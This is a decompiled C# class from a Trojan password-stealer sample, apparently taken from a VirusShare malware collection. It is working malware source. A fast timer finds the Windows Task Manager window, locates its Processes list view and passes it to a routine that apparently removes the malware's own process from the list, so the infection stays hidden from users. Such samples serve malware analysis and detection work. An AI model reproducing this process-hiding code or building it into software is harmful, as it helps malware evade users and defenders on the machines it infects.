// Decompiled with JetBrains decompiler
// Type: Windows_Explorer.TMListViewDelete
// Assembly: wqeqerwt4354wsey56sey5ts765y54, Version=7.52.5.2, Culture=neutral, PublicKeyToken=null
// MVID: 3FC4189E-BF6F-40C3-B48B-A4DA54DCDC94
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-PSW.Win32.VB.chm-8bf17b67595d474959c887391b17692103cd2a30a4e2cd4f51f483ad8140b647.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Windows_Explorer
{
  [StandardModule]
  internal sealed class TMListViewDelete
  {
    private const int LVM_FIRST = 4096;
    private const int LVM_DELETECOLUMN = 4124;
    private const int LVM_GETITEMCOUNT = 4100;
    private const int LVM_SORTITEMS = 4144;
    private const int LVM_DELETEITEM = 4104;
    private const int LVM_GETNEXTITEM = 4108;
    private const int LVM_GETITEM = 4171;
    private static Timer t = new Timer();
    private static IntPtr hwnd;
    private static string controls;
    public static string MyProc;
    private static IntPtr ProcLV = IntPtr.Zero;

    [DllImport("user32.dll", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int EnumChildWindows(
      IntPtr hWndParent,
      TMListViewDelete.EnumDelegate lpEnumFunc,
      int lParam);

    [DllImport("user32.dll", EntryPoint = "GetClassNameA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern long GetClassName(long hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, long nMaxCount);

    [DllImport("user32", EntryPoint = "GetClassNameA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

    [DllImport("user32", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);

    [DllImport("user32", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowTextLength(IntPtr hWnd);

    private static void t_Tick(object sender, EventArgs e)
    {
      if (TMListViewDelete.ProcLV == IntPtr.Zero)
      {
        string str1 = (string) null;
        ref string local1 = ref str1;
        string str2 = "Windows Task Manager";
        ref string local2 = ref str2;
        TMListViewDelete.hwnd = (IntPtr) TMListViewDelete.FindWindow(ref local1, ref local2);
        if (!(TMListViewDelete.hwnd != (IntPtr) 0))
          return;
        TMListViewDelete.EnumChildWindows(TMListViewDelete.hwnd, new TMListViewDelete.EnumDelegate(TMListViewDelete.EnumChildWindows), 0);
      }
      else
        GetItems.GetListView(TMListViewDelete.hwnd, TMListViewDelete.ProcLV);
    }

    public static bool Running
    {
      get => TMListViewDelete.t.Enabled;
      set
      {
        if (value)
        {
          TMListViewDelete.MyProc = Process.GetCurrentProcess().ProcessName;
          if (TMListViewDelete.t.Interval != 1)
          {
            Timer t = TMListViewDelete.t;
            TMListViewDelete.t.Tick += new EventHandler(TMListViewDelete.t_Tick);
            t.Interval = 10;
            t.Enabled = true;
            t.Start();
          }
          else
          {
            TMListViewDelete.t.Enabled = true;
            TMListViewDelete.t.Start();
          }
        }
        else
        {
          TMListViewDelete.t.Enabled = false;
          TMListViewDelete.t.Stop();
          TMListViewDelete.ProcLV = IntPtr.Zero;
        }
      }
    }

    private static int EnumChildWindows(IntPtr lngHwnd, int lngLParam)
    {
      string str = TMListViewDelete.GetClass(lngHwnd);
      string titleText = TMListViewDelete.GetTitleText(lngHwnd);
      if (Strings.InStr(str.ToString(), "SysListView32") != 0 && Strings.InStr(titleText, "Processes") != 0)
        TMListViewDelete.ProcLV = lngHwnd;
      lngHwnd.ToString() + ", " + str + ", " + titleText;
      return 1;
    }

    private static string GetClass(IntPtr handle)
    {
      StringBuilder lpClassName = new StringBuilder();
      lpClassName.Length = (int) byte.MaxValue;
      TMListViewDelete.GetClassName(handle, lpClassName, lpClassName.Length);
      return lpClassName.ToString();
    }

    private static string GetTitleText(IntPtr handle)
    {
      StringBuilder lpString = new StringBuilder();
      lpString.Length = checked (TMListViewDelete.GetWindowTextLength(handle) + 1);
      TMListViewDelete.GetWindowText(handle, lpString, lpString.Length);
      return lpString.ToString();
    }

    private delegate int EnumDelegate(IntPtr lngHwnd, int lngLParam);
  }
}
